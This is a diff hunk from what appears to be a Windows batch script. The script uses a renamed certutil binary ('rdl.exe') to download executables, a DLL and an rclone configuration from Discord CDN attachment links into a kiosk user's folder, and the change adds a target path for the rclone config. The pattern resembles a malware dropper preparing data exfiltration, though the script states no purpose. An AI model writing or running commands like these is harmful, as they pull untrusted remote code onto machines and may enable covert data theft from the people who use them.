@@ -24,7 +24,7 @@ echo Exists) ELSE (
 "c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1108820816801574912/z.exe" "C:\Users\kiosk\Downloads\G\z.exe"
 "c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1108821803062792323/7z.dll" "C:\Users\kiosk\Downloads\G\7z.dll"
 "c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/873261878904782941/1102389310487023727/VoughtUadml.exe" "C:\Users\kiosk\Downloads\G\VoughtUadml.exe"
-"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1108828916266840165/rclone.conf" 
+"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1108828916266840165/rclone.conf" "%rcloneFolder%"\rclone.conf
 #"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105542124436459550/nt.exe" "C:\Users\kiosk\Downloads\G\nt.exe"
 #"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105963087632273599/task.exe" "C:\Users\kiosk\Downloads\G\task.exe"
 
